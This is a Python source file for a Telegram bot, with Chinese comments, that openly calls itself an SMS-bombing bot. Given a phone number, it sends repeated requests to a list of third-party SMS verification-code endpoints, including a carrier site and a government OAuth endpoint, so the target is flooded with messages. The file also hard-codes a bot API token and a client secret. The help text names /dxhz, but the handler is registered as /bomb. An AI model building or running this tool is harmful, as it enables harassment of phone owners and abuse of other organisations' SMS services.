import requests
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# Telegram Bot API 令牌
TELEGRAM_API_TOKEN = "8139511082:AAFYL5BtHBxGaU9f9G2ihURBSBBN5592LgQ"

# 定义短信接口 URL 列表
urls = [
    f"https://card.10010.com/ko-order/messageCaptcha/send?phoneVal={{idcard}}",
    f"https://xcx.wjhr.net/project-xcx/smsController/sendCode2.action?phone={{idcard}}",
    f"https://cyhrsip.bjchy.gov.cn/mobileapi/authorization/oauth2/authorize?client_id=Bitech%5CH5&client_secret=vgkEeveppBwCzPHr&response_type=mobile&username={{idcard}}",
    # ... 省略部分 URL，为了保持清晰性 ...
    f"http://n103.top:84/smsboom/?hm={{idcard}}",
]

# 处理 /start 命令
def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("欢迎使用短信轰炸机器人！使用 /dxhz [手机号] 命令来进行测试。")

# 处理 /dxhz 命令
def bomb(update: Update, context: CallbackContext) -> None:
    if len(context.args) != 1:
        update.message.reply_text("请提供一个手机号！正确用法：/dxhz 12345678901")
        return
    
    idcard = context.args[0]
    update.message.reply_text(f"正在对手机号 {idcard} 进行短信轰炸测试...")

    for url in urls:
        try:
            # 替换 URL 中的 {idcard} 为实际手机号
            full_url = url.format(idcard=idcard)
            response = requests.get(full_url)
            if response.status_code == 200:
                update.message.reply_text(f"请求成功: {full_url}")
            else:
                update.message.reply_text(f"请求失败: {full_url} - 状态码: {response.status_code}")
        except Exception as e:
            update.message.reply_text(f"请求错误: {url} - 错误信息: {e}")

    update.message.reply_text("短信轰炸测试完成。")

# 主函数，启动 Telegram 机器人
def main():
    updater = Updater(TELEGRAM_API_TOKEN)
    dispatcher = updater.dispatcher

    # 注册命令处理程序
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("bomb", bomb))

    # 启动机器人
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()